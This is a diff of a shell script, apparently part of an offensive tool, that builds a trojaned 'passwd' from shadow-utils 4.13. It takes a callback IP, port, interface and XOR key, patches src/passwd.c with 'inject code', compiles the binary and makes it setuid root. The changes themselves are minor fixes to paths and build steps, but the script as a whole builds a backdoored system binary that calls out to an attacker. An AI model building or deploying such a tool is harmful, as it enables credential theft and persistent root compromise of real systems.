@@ -3,7 +3,7 @@
 ## Check if Root ##
 if [ "$EUID" -ne 0 ]; then 
   echo "Must run as superuser"
-  echo "Usage : ./generate {Callback IP} {Port} {Interface} {XOR Key}"
+  echo "Usage : ./generate.sh {Callback IP} {Port} {Interface} {XOR Key}"
   exit
 fi
 
@@ -31,8 +31,12 @@ sudo pip3 install python-dotenv
 
 wget -nc https://github.com/shadow-maint/shadow/archive/refs/tags/4.13.tar.gz -O shadow.tar.gz
 tar -xf shadow.tar.gz
+
 cd shadow-4.13
-./autogen.sh --without-selinux
+FILE=Makefile
+if [ ! -f "$FILE" ]; then
+    ./autogen.sh --without-selinux
+fi
 cd ../
 
 ## Add Inject Code ##
@@ -48,5 +52,5 @@ patch src/passwd.c ../passwd.patch
 ## Make ##
 sudo make all 
 cd ../
-cp shadow-4.13/src/passwd ../
+cp shadow-4.13/src/passwd ./passwd
 chmod 4755 passwd 
